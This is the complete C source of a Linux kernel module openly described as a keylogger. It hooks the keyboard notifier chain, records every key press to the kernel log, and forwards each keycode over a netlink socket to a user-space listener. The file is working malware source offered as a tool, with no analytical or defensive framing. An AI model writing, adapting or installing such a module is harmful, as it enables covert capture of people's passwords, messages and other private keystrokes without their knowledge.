#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>
#include <linux/netlink.h>
#include <net/sock.h>
#include <linux/skbuff.h>

#define NETLINK_USER 31

struct sock *nl_sk = NULL;

static void send_keystroke_to_user(int keycode, char ascii_char) {
    struct sk_buff *skb_out;
    struct nlmsghdr *nlh;
    int msg_size = sizeof(int) + sizeof(char);
    int pid = 0;  // Use your user-space application PID here
    int res;

    char msg[msg_size];
    memcpy(msg, &keycode, sizeof(int));
    memcpy(msg + sizeof(int), &ascii_char, sizeof(char));

    skb_out = nlmsg_new(msg_size, 0);
    if (!skb_out) {
        printk(KERN_ERR "Keylogger: Failed to allocate new skb\n");
        return;
    }

    nlh = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_size, 0);
    NETLINK_CB(skb_out).dst_group = 0;  // Not in multicast group
    memcpy(nlmsg_data(nlh), msg, msg_size);

    res = nlmsg_unicast(nl_sk, skb_out, pid);
    if (res < 0) {
        printk(KERN_INFO "Keylogger: Error while sending to user-space\n");
    }
}

static int keylogger_notifier(struct notifier_block *nb, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = data;

    if (action == KBD_KEYSYM && param->down) {
        printk(KERN_INFO "Keylogger: Captured keycode: %d, ASCII: %c\n", param->value, param->value);
        send_keystroke_to_user(param->value, param->value);
    }

    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb = {
        .notifier_call = keylogger_notifier
};

static void netlink_recv_msg(struct sk_buff *skb) {
    struct nlmsghdr *nlh = (struct nlmsghdr *)skb->data;
    int pid = nlh->nlmsg_pid; // PID of sending process
    printk(KERN_INFO "Netlink received msg payload: %s\n", (char *)nlmsg_data(nlh));
    // Store PID for responding to user-space
}

static int __init keylogger_init(void) {
    printk(KERN_INFO "Keylogger Module: Initializing...\n");

    // Register the notifier block for keyboard events
    int ret = register_keyboard_notifier(&keylogger_nb);
    if (ret) {
        printk(KERN_ERR "Keylogger Module: Failed to register keyboard notifier\n");
        return ret;
    }

    // Create a netlink socket
    struct netlink_kernel_cfg cfg = {
            .input = netlink_recv_msg,
    };
    nl_sk = netlink_kernel_create(&init_net, NETLINK_USER, &cfg);
    if (!nl_sk) {
        printk(KERN_ALERT "Error creating socket.\n");
        unregister_keyboard_notifier(&keylogger_nb);
        return -ENOMEM;
    }

    printk(KERN_INFO "Keylogger Module: Registered keyboard notifier and netlink socket successfully\n");
    return 0;
}

static void __exit keylogger_exit(void) {
    printk(KERN_INFO "Keylogger Module: Exiting...\n");

    // Unregister the notifier block
    unregister_keyboard_notifier(&keylogger_nb);

    // Close the netlink socket
    netlink_kernel_release(nl_sk);

    printk(KERN_INFO "Keylogger Module: Unregistered keyboard notifier and closed netlink socket successfully\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ariel Ayalon");
MODULE_DESCRIPTION("A keylogger kernel module with netlink communication");
